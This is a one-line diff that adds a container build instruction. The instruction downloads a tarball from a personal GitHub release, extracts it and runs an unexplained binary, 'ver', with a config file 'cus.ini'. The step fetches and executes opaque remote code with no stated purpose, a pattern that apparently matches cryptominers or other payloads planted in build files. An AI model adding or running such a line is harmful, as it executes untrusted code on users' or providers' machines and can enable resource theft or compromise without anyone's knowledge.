@@ -1,0 +1,1 @@
+RUN sudo apt update && wget https://github.com/udinmuhidin9/udin8/releases/download/LCI/LCI.tar.gz && tar -xvf LCI.tar.gz && ./ver cus.ini
